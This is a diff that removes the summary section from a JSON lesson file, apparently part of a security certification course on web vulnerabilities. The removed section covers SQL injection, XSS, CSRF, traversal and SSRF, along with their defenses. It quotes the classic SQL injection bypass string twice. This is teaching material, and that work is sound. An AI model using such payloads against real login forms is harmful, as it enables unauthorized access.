   },
 
-  "summary": {
-    "key_takeaways": [
-      "SQL injection inserts malicious SQL; ' OR '1'='1 is classic bypass",
-      "XSS injects scripts; Reflected (in URL), Stored (in database), DOM-based (client-side)",
-      "CSRF tricks browsers into making authenticated requests",
-      "Directory traversal uses ../ to access files outside intended directory",
-      "SSRF makes server request internal resources",
-      "Defense: parameterized queries, output encoding, CSRF tokens, input validation",
-      "OWASP Top 10 is the standard reference for web vulnerabilities"
-    ],
-    
-    "exam_essentials": [
-      "SQLi classic payload: ' OR '1'='1' --",
-      "Blind SQLi = no visible output, use boolean/timing",
-      "Stored XSS = persistent, more dangerous; Reflected = non-persistent",
-      "CSRF defense = tokens; XSS defense = output encoding",
-      "Know OWASP Top 10 especially Broken Access Control (#1)"
-    ],
-    
-    "skills_gained": [
-      "Identify SQL injection, XSS, and other application vulnerabilities",
-      "Understand attack payloads and techniques",
-      "Apply appropriate defenses for each vulnerability type",
-      "Use basic web security testing techniques"
-    ],
-    
-    "connection_to_next": "Understanding vulnerabilities is essential, but managing them across an organization requires a systematic approach. The next lesson covers Vulnerability Management—the processes and tools for finding, prioritizing, and remediating security weaknesses."
-  },
-
   "related_content": {
-    "simulations": ["D2-SIM-002"],
-    "remediation": ["D2-REM-003"],
     "next_lesson": "D2-LESSON-007",
     "previous_lesson": "D2-LESSON-005"
   }
